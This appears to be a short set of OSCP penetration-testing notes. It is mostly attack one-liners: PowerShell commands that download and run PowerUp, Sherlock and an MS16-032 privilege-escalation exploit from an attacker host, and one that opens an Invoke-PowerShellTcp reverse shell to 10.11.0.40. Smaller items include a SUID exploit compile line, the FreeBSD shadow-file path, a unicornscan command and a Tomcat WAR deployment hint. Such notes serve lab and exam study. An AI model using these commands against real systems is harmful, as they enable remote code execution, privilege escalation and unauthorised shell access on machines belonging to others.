# for-oscp
some notes ,scripts
# 本地编译exp 如果目标机器没有gcc
gcc -m32 -Wl,--hash-style=both -o suid suid.c
# accesschk.exe usage

accesschk.exe -uwcqv "Users" * /accepteula
accesschk.exe -ucqv [service_name] 
# windows powershell priv sc 
# powerup for basic check
powershell -nop -exec bypass IEX (New-Object Net.WebClient).DownloadString('http://10.11.0.40:8000/PowerUp.ps1'); Invoke-AllChecks
# sherlock for kernel check
powershell -nop -exec bypass IEX (New-Object Net.WebClient).DownloadString('http://10.11.0.40:8000/Sherlock.ps1') ; Find-AllVulns
# ms16-032
powershell -nop -exec bypass -c "IEX (New-Object Net.WebClient).DownloadString('http://10.11.0.40:8000/ms16_032_intrd_mod.ps1');Invoke-MS16-032 \
"-NoProfile -ExecutionPolicy Bypass -Command IEX (New-Object Net.WebClient).DownloadString('http://10.11.0.40:8000/Invoke-PowerShellTcp.ps1');Invoke-PowerShellTcp -Reverse -IPAddress 10.11.0.40 -Port 445\" "

# export PATH="/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/bin"

# freebsd shadow file is /etc/spwd.db

# WINDOWS/setupapi.log /usr/share/seclists/Fuzzing/Windows-Attacks.fuzzdb.txt  some windows local files

# unicorn scan
unicornscan -i tap0 -Ir 160 10.11.1.22:1-4000

# tomcat manager console deploy war 
10.11.1.209:8080/[war_name]  

